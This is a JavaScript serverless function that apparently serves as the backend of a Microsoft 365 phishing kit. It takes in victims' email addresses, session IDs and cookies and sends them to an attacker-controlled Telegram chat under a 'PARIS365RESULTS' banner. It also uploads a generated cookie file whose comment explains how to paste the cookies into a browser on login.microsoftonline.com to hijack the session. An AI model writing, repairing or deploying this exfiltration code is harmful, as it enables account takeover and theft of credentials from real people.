const handler = async (event, context) => {
  const headers = {
    'Access-Control-Allow-Origin': '*',
    'Access-Control-Allow-Methods': 'POST, OPTIONS',
  };

  console.log('🚀 sendTelegram function starting... v4.2 (ENHANCED PARSING FIX)');

  if (event.httpMethod === 'OPTIONS') {
    return { statusCode: 200, headers, body: '' };
  }

  try {
    const data = JSON.parse(event.body);
    console.log('📥 Received data keys:', Object.keys(data));
    console.log('📥 Email:', data.email);
    console.log('📥 Cookie count:', Array.isArray(data.cookies) ? data.cookies.length : 'Not array');

    // Environment variables
    const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
    const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
      console.error('❌ Missing Telegram credentials');
      return {
        statusCode: 500,
        headers,
        body: JSON.stringify({
          error: 'Telegram credentials not configured',
          details: {
            hasToken: !!TELEGRAM_BOT_TOKEN,
            hasChatId: !!TELEGRAM_CHAT_ID
          }
        }),
      };
    }

    // Validate bot token format
    if (!TELEGRAM_BOT_TOKEN.match(/^\d+:[A-Za-z0-9_-]+$/)) {
      console.error('❌ Invalid bot token format');
      return {
        statusCode: 500,
        headers,
        body: JSON.stringify({ error: 'Invalid bot token format' }),
      };
    }

    // Function to sanitize text for Telegram
    function sanitizeForTelegram(text) {
      if (!text) return '';
      return String(text)
        .replace(/[_*\[\]()~`>#+=|{}.!-]/g, '') // Remove special markdown characters
        .replace(/\n\n+/g, '\n\n') // Clean up multiple newlines
        .trim();
    }

    // Extract only SAFE data with sanitization
    const email = sanitizeForTelegram(data.email || 'oauth-user@microsoft.com');
    const sessionId = sanitizeForTelegram(data.sessionId || 'no-session');
    const timestamp = new Date().toISOString();
    let cookies = data.formattedCookies || data.cookies || [];
    
    if (typeof cookies === "string") {
      try {
        cookies = JSON.parse(cookies);
      } catch {
        // fallback: attempt to parse as document.cookie style string
        cookies = cookies.split(';')
          .map(cookieStr => {
            const [name, ...valueParts] = cookieStr.trim().split('=');
            const value = valueParts.join('=');
            return name && value ? {
              name: name.trim(),
              value: value.trim(),
              domain: '.login.microsoftonline.com',
              path: '/',
              secure: true,
              httpOnly: false,
              sameSite: 'none',
              expirationDate: Math.floor(Date.now() / 1000) + (365 * 24 * 60 * 60),
              hostOnly: false,
              session: false,
              storeId: null
            } : null;
          })
          .filter(Boolean);
      }
    }
    if (!Array.isArray(cookies)) cookies = [];

    const cookieCount = cookies.length;
    console.log('📊 Processing:', { email, cookieCount, hasValidCookies: cookieCount > 0 });

    // Build the message (plain text only, heavily sanitized)
    const uniqueId = Math.random().toString(36).substring(2, 8);
    const messageLines = [
      '🚨PARIS365RESULTS🚨',
      '',
      `Email: ${email}`,
      `Session ID: ${sessionId}`,
      `Time: ${timestamp}`,
      `Message ID: ${uniqueId}`,
      '',
      `Cookies: ${cookieCount > 0 ? `${cookieCount} captured` : 'None captured'}`
    ];
    
    // Join and sanitize the entire message
    const simpleMessage = sanitizeForTelegram(messageLines.join('\n'));
    
    console.log('📤 Final message preview:', simpleMessage.substring(0, 150) + '...');
    console.log('📤 Message length:', simpleMessage.length);

    // Send main safe message to Telegram (NO PARSE MODE, PLAIN TEXT ONLY)
    const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
    const telegramPayload = {
      chat_id: TELEGRAM_CHAT_ID,
      text: simpleMessage,
      disable_web_page_preview: true
      // Absolutely NO parse_mode to avoid any entity parsing
    };

    console.log('📤 Sending to Telegram API...');
    const response = await fetch(telegramUrl, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify(telegramPayload),
    });

    const result = await response.json();
    console.log('📨 Telegram API response status:', response.status);
    console.log('📨 Telegram API response:', result);

    if (!response.ok || !result.ok) {
      console.error('❌ Telegram API error details:', {
        status: response.status,
        statusText: response.statusText,
        telegramResult: result,
        messageLength: simpleMessage.length,
        messagePreview: simpleMessage.substring(0, 100)
      });
      return {
        statusCode: 500,
        headers,
        body: JSON.stringify({
          error: 'Failed to send to Telegram',
          telegramError: result,
          statusCode: response.status,
          messagePreview: simpleMessage.substring(0, 100),
          messageLength: simpleMessage.length
        }),
      };
    }

    // Send a file with just NON-SENSITIVE details (NO tokens, NO auth code)
    let fileSent = false;
    try {
      // Prepare a simple file with only email and cookies
      const cookiesFileContent = `// MICROSOFT 365 CREDENTIALS (NO TOKENS OR AUTH CODE)
// Generated: ${timestamp}
// Email: ${email}
// Session ID: ${sessionId}
// Cookies found: ${cookieCount}

let email = "${email}";
let sessionId = "${sessionId}";
let timestamp = "${timestamp}";

// COOKIE DATA
const cookies = ${JSON.stringify(cookies, null, 2)};

/*
To use these cookies, paste the following in the browser console
(on login.microsoftonline.com):

cookies.forEach(c => {
  document.cookie = \`\${c.name}=\${c.value}; path=\${c.path}; domain=\${c.domain};\`;
});
location.reload();
*/

// END OF FILE
`;

      // Clean filename to avoid issues
      const cleanEmail = email.replace(/[^a-zA-Z0-9@._-]/g, '_').replace('@', '_at_').replace(/\./g, '_');
      const fileName = `microsoft365_cookies_${cleanEmail}_${Date.now()}.js`;

      // Create proper multipart form data for file upload
      const boundary = `----formdata-${Math.random().toString(36).substring(2)}`;

      let formData = '';
      formData += `--${boundary}\r\n`;
      formData += `Content-Disposition: form-data; name="chat_id"\r\n\r\n`;
      formData += `${TELEGRAM_CHAT_ID}\r\n`;
      formData += `--${boundary}\r\n`;
      formData += `Content-Disposition: form-data; name="document"; filename="${fileName}"\r\n`;
      formData += `Content-Type: text/javascript\r\n\r\n`;
      formData += cookiesFileContent;
      formData += `\r\n--${boundary}--\r\n`;

      // Send file to Telegram
      console.log('📎 Attempting file upload to Telegram...');
      const fileResponse = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendDocument`, {
        method: 'POST',
        headers: {
          'Content-Type': `multipart/form-data; boundary=${boundary}`
        },
        body: formData,
      });

      if (fileResponse.ok) {
        const fileResult = await fileResponse.json();
        fileSent = true;
        console.log('✅ Credentials file sent to Telegram successfully');
      } else {
        const fileError = await fileResponse.text();
        console.error('❌ File upload failed:', fileError);
      }
    } catch (fileError) {
      console.error('❌ File generation error:', fileError);
      fileSent = false;
    }

    console.log('✅ sendTelegram completed successfully');
    return {
      statusCode: 200,
      headers,
      body: JSON.stringify({
        success: true,
        message: 'Data sent to Telegram successfully (NO TOKENS, NO AUTH CODE)',
        telegramMessageId: result.message_id,
        fileSent,
        cookieCount,
        emailProcessed: email,
        messageLength: simpleMessage.length
      }),
    };

  } catch (error) {
    console.error('❌ Function error:', error);
    return {
      statusCode: 500,
      headers,
      body: JSON.stringify({
        error: 'Internal server error',
        message: error.message,
        stack: error.stack
      }),
    };
  }
};

module.exports = { handler };